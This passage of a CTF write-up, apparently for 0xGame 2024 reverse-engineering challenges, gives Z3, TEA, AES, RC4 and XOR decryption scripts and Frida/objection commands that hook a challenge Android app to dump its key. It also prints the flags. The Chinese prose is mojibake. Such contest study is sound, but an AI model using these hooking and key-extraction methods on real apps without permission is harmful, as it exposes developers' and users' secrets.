class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>], <br>         [<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]]<br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ª9x9çš„çŸ©é˜µï¼Œå­˜æ”¾Z3å˜é‡ï¼ˆæ¯ä¸ªæ ¼å­ä¸€ä¸ªå˜é‡ï¼‰</span><br>X = [[Int(<span class="hljs-string">f&#x27;x_<span class="hljs-subst">&#123;i&#125;</span>_<span class="hljs-subst">&#123;j&#125;</span>&#x27;</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># çº¦æŸ1ï¼šæ‰€æœ‰å˜é‡å–å€¼èŒƒå›´åœ¨1åˆ°9ä¹‹é—´</span><br>cells_c = [And(X[i][j] &gt;= <span class="hljs-number">1</span>, X[i][j] &lt;= <span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># çº¦æŸ2ï¼šæ¯ä¸€è¡Œçš„æ•°å­—ä¸èƒ½é‡å¤</span><br>rows_c = [Distinct(X[i]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># çº¦æŸ3ï¼šæ¯ä¸€åˆ—çš„æ•°å­—ä¸èƒ½é‡å¤</span><br>cols_c = [Distinct([X[i][j] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># çº¦æŸ4ï¼šæ¯ä¸ª3x3çš„å­æ–¹æ ¼ä¸­çš„æ•°å­—ä¸èƒ½é‡å¤</span><br>squares_c = [Distinct([X[<span class="hljs-number">3</span> * i + di][<span class="hljs-number">3</span> * j + dj] <span class="hljs-keyword">for</span> di <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> dj <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)])<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>)]<br><br><span class="hljs-comment"># çº¦æŸ5ï¼šå·²çŸ¥çš„æ£‹ç›˜æ•°å­—éœ€è¦ä¿æŒä¸å˜</span><br>instance_c = [If(board[i][j] == <span class="hljs-number">0</span>, <span class="hljs-literal">True</span>, X[i][j] == board[i][j]) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><br><span class="hljs-comment"># åˆ›å»ºæ±‚è§£å™¨</span><br>solver = Solver()<br>solver.add(cells_c + rows_c + cols_c + squares_c + instance_c)<br><br><span class="hljs-comment"># æ£€æŸ¥æ˜¯å¦æœ‰è§£</span><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    result_board = [[model.evaluate(X[i][j]) <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br>    <span class="hljs-comment"># æ‰“å°å¡«å……å¥½çš„æ•°ç‹¬</span><br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> result_board:<br>        <span class="hljs-built_in">print</span>(row)<br>    <br>    <span class="hljs-comment"># å°†è§£è½¬æ¢ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œç”¨äºç”Ÿæˆè¾“å…¥</span><br>    nextLine = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>            <span class="hljs-keyword">if</span> board[i][j] == <span class="hljs-number">0</span>:<br>                nextLine += <span class="hljs-built_in">str</span>(model.evaluate(X[i][j]))<br>    <br>    <span class="hljs-built_in">print</span>(nextLine)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ— è§£&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ±‚å‡ºnextLineä¹‹å6ä¸ªæ•°å­—ä¸€ç»„ï¼Œ10è½¬16ä¹‹åä½œä¸ºå­—ç¬¦åŠ åˆ°sbä¸­è¾“å‡º</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729412596110-e7a06992-e113-49e1-a1ea-3beb46b8e120.png" class="" title="img"><h3 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h3><p>ä¸€å¼€å§‹æŠŠå¯†æ–‡å‰åäº¤æ¢ï¼Œç›´æ¥è§£å¯†å‘ç°ä¸­é—´é”™è¯¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum, i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x61C88647</span>;<br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x85336dd3</span>,<span class="hljs-number">0x2a7a7c3b</span>,<span class="hljs-number">0x64306238</span>,<span class="hljs-number">0x36396434</span>,<span class="hljs-number">0x62336364</span>,<span class="hljs-number">0x38376533</span>,<span class="hljs-number">0x37323664</span>,<span class="hljs-number">0x33363463</span>,<span class="hljs-number">0xf8ee8ea2</span>,<span class="hljs-number">0xc9b65cce</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">10</span>; m += <span class="hljs-number">2</span>) &#123;<br>        sum = delta*(<span class="hljs-number">-32</span>);<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123; <br>            v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + sum) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>            v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + sum) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>            sum += delta;<br>        &#125; <br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729416171742-505968c8-1d6f-4fd3-bb2d-268b89e97ca4.png" class="" title="img"><p>è°ƒè¯•å‘ç°ä¹‹åå‰8ä½å’Œæœ€å8ä½è¿›è¡Œäº†åŠ å¯†ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸­é—´24ä½ä¸å˜</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729415989369-10df214f-88ae-4797-b4b8-19422074ea31.png" class="" title="img"><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">æœ€ç»ˆçš„flag:<span class="hljs-number">0</span>xGame&#123;e<span class="hljs-number">8</span>b<span class="hljs-number">0</span>d<span class="hljs-number">4</span>d<span class="hljs-number">96</span>dc<span class="hljs-number">3</span>b<span class="hljs-number">3e78</span>d<span class="hljs-number">627</span><span class="hljs-keyword">c</span><span class="hljs-number">463</span><span class="hljs-keyword">c</span><span class="hljs-number">9953</span>a<span class="hljs-number">1</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="ezAndroid"><a href="#ezAndroid" class="headerlink" title="ezAndroid"></a>ezAndroid</h3><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729425443383-310cd0ae-6ab1-434d-998a-935e18b07df9.png" class="" title="img"><p>ç›´æ¥æœç´¢secretæ‰¾åˆ°å¯†æ–‡</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1729425430116-ff7eb4b5-fc90-4746-9a40-f1385f16d0dd.png" class="" title="img"><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="PyPro"><a href="#PyPro" class="headerlink" title="PyPro"></a>PyPro</h3><p>python3.12æ— æ³•å®Œå…¨åç¼–è¯‘ï¼Œè¦ç”¨pydas</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730000706978-1346bbf7-c59b-44b3-8385-c7d4ea99fa00.png" class="" title="img"><p>çŸ¥é“å…ˆaes_ecbå†base64</p><p>cyå¥½åƒè§£ä¸äº†ç”¨è„šæœ¬è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br>key = <span class="hljs-number">0x554B134A029DE539438BD18604BF114</span><br><br>key_bytes = key.to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-built_in">print</span>(key_bytes)<br><br>encrypted_data = <span class="hljs-string">&quot;2e8Ugcv8lKVhL3gkv3grJGNE3UqkjlvKqCgJSGRNHHEk98Kd0wv6s60GpAUsU+8Q&quot;</span><br><br>encrypted_bytes = base64.b64decode(encrypted_data)<br><br><br>cipher = AES.new(key_bytes, AES.MODE_ECB)<br><br><span class="hljs-keyword">try</span>:<br>    decrypted_data = unpad(cipher.decrypt(encrypted_bytes), AES.block_size)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†ç»“æœ:&quot;</span>, decrypted_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">except</span> (ValueError, KeyError):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†å¤±è´¥æˆ–å¡«å……é”™è¯¯ï¼&quot;</span>)<br></code></pre></td></tr></table></figure><p>å‘ç°å¯†é’¥æ˜¯å¥‡æ•°ä½ï¼Œ15.5ä¸ªå­—èŠ‚ï¼Œå‰é¢è¡¥ä¸€ä¸ª0</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730112516529-b4f8be4f-7213-4180-a65c-ee257606463d.png" class="" title="img"><h3 id="tea2-0"><a href="#tea2-0" class="headerlink" title="tea2.0"></a>tea2.0</h3><p>mainä¸€ä¸ªtea</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730009659874-e0e1d12a-5e41-43f6-83d6-5297bbdf6bf9.png" class="" title="img"><p>äº¤å‰å¼•ç”¨å¯†æ–‡å‘ç°æœ‰tls</p><p>å‘ç°ä¹Ÿæ˜¯ä¸€æ¬¡teaï¼Œä½†æ˜¯ä¸ç”¨ç®¡ç›´æ¥åŠ¨è°ƒè·å–æœ€åçš„å¯†æ–‡</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730009743215-4186c384-baf7-4673-8729-2e354d7a62e1.png" class="" title="img"><p>æœ‰ä¸ªå¥‡æ€ªçš„ç‚¹æ˜¯æ˜æ˜å¯†æ–‡æœ‰48ä½ï¼Œä¸ºä»€ä¹ˆæ¯”è¾ƒçš„æ—¶å€™åªæœ‰44ä½</p><p>ç»è¿‡è°ƒè¯•å‘ç°æœ€åä¸€è½®çš„v1åˆå§‹å€¼æ˜¯0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], delta = <span class="hljs-number">0x61C88647</span>, sum = delta * (<span class="hljs-number">-64</span>);<br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++) &#123;<br>        v1 -= (((v0 &lt;&lt; <span class="hljs-number">4</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum&gt;&gt;<span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>]);<br>        sum += delta;<br>        v0 -= (((v1 &lt;&lt; <span class="hljs-number">4</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x4512</span>,<span class="hljs-number">0x9832</span>,<span class="hljs-number">0x5647</span>,<span class="hljs-number">0x6314</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> enc[] = &#123;<span class="hljs-number">0xd04bb2c4</span>,<span class="hljs-number">0xa625cf11</span>,<span class="hljs-number">0x57686f2b</span>,<span class="hljs-number">0x3b181680</span>,<span class="hljs-number">0x6fc33f75</span>,<span class="hljs-number">0x1779b334</span>,<span class="hljs-number">0xd95ca4f6</span>,<span class="hljs-number">0xc1ca9fa2</span>,<span class="hljs-number">0x651a6aff</span>,<span class="hljs-number">0xc9ddba37</span>,<span class="hljs-number">0x3087d163</span>,<span class="hljs-number">0x187d7e10</span>&#125;;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">12</span>; i+=<span class="hljs-number">2</span>)&#123;<br>        decrypt(&amp;enc[i], k);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">12</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (enc[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="MineSweeper"><a href="#MineSweeper" class="headerlink" title="MineSweeper"></a>MineSweeper</h3><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730018174056-78df7315-e2ec-4415-b4e0-c689ac0efa78.png" class="" title="img"><p>å…ˆæ˜¯äº¤æ¢åé¢å¼‚æˆ–ï¼Œå¦å¤–ä»èµ„æºæ®µåŠ è½½å¯†æ–‡</p><p><img src="/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730020816792-e192a16f-38ca-4e43-8ad3-8a0491b7c428-17648284311901.png" alt="img"><img src="/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730018488335-3249dd7b-11c3-4843-b40c-44b33fcfc766-17648284311913.png" alt="img"></p><p>hahaå°±æ˜¯KEY<img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730018505000-f4806c5a-a2e2-430d-8189-23832fe07178.png" class="" title="img"></p><p>encä»resources.assetsä¸­åŠ è½½</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730020786128-746b332b-6ad5-4cfa-a05c-a0cd76e988bb.png" class="" title="img"><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730020902049-3567b8d5-1bd1-410c-8373-8f93cb157a31.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">key=<span class="hljs-string">&#x27;0xoX0XOxOXoxGAME&#x27;</span><br>arr=[<span class="hljs-number">0x45</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x3E</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x09</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x42</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x5D</span>,<span class="hljs-number">0x5A</span>,<span class="hljs-number">0x4B</span>,<span class="hljs-number">0x4B</span>,<br>     <span class="hljs-number">0x52</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x6C</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0x35</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x0D</span>,<span class="hljs-number">0x58</span>,<br>     <span class="hljs-number">0x15</span>,<span class="hljs-number">0x71</span>,<span class="hljs-number">0x11</span>,<span class="hljs-number">0x1B</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x08</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x4F</span>,<span class="hljs-number">0x5C</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x3C</span>]<br>num=<span class="hljs-number">0</span><br>s=<span class="hljs-string">&#x27;This is: True_KEY!for #0xgAmE_Unity~Cryption&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(s))<br>KEY=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s)):<br>    KEY.append(<span class="hljs-built_in">ord</span>(s[i]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    num=(num+<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)]))%<span class="hljs-number">44</span><br>    KEY[i],KEY[num]=KEY[num],KEY[i]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">44</span>):<br>    arr[i]^=KEY[i]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(arr[i]),end=<span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment">#0xGame&#123;36ecd059-b3e7-73c8-fa80-0a2abef3c757&#125;</span><br></code></pre></td></tr></table></figure><h3 id="crack"><a href="#crack" class="headerlink" title="crack"></a>crack</h3><p>ç»è¿‡è°ƒè¯•å‘ç°å¼‚æˆ–çš„æ•°ä¸€ç›´ä¸º6</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730026977143-927073b8-b730-4e18-80ad-d224acce30ea.png" class="" title="img"><p>é—®gptå‘ç°æ˜¯sha256</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730026874817-782bf294-e0f9-45c5-819b-73fcc46914e2.png" class="" title="img"><p>è°ƒè¯•å‘ç°buf1å°±æ˜¯è¾“å…¥çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯è¾“å…¥ç‰¹å®šhashå€¼å³å¯</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730027348807-e8ed697f-87c2-40e5-9dc2-6a1cf1030214.png" class="" title="img"><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0xGame</span>&#123;<span class="hljs-number">1</span>b4e549d12ccb4bb4936f95fedecebf55494dec8&#125;<br></code></pre></td></tr></table></figure><h3 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h3><p>getKeyåœ¨nativeå±‚</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079449599-604a4f2f-930b-4fd9-ad2a-31b663c75bfc.png" class="" title="img"><p>ç›´æ¥åœ¨èµ„æºæ®µæœç´¢å¯†æ–‡</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079639545-5cff6428-debb-48c9-80d6-9d1786f2710b.png" class="" title="img"><p>å¾—åˆ°keyårc4ï¼Œæœ‰ä¸€å¤„é­”æ”¹</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079511930-564ba5b8-b6a9-4942-a927-ae6dd103da80.png" class="" title="img"><p>ä¹‹åå†base64</p><p>getKeyçš„éƒ¨åˆ†é™æ€æœ‰ç‚¹å¤æ‚</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079666052-67d6a2f0-60e1-4af9-bf6c-e2e734fba99f.png" class="" title="img"><p>ç›´æ¥å°è¯•ç”¨objectionæ³¨å…¥å¾—åˆ°rc4çš„keyï¼Œandroid hooking watch class_method com.ctf.justsoso.MainActivity.getKey â€“dump-return</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730079430409-422a7bb9-a018-4c2d-b147-f3c46fc9d987.png" class="" title="img"><p>ç”¨fridaä¹Ÿè¡Œï¼Œfrida -U -l 1.js -f com.ctf.justsoso</p><img src="/2024/10/23/0xGame2024%E9%83%A8%E5%88%86Reverse%E4%B8%8ECrypto/1730082161906-484dc468-5717-4f65-93bd-29be17d613ab.png" class="" title="img"><p>æœ€åè§£å¯†å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4</span>(<span class="hljs-params">data, key</span>):<br>    S = [<span class="hljs-number">0</span>]*<span class="hljs-number">256</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        S[i]=<span class="hljs-number">256</span>-i<br>    j = <span class="hljs-number">0</span><br>    out = []<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 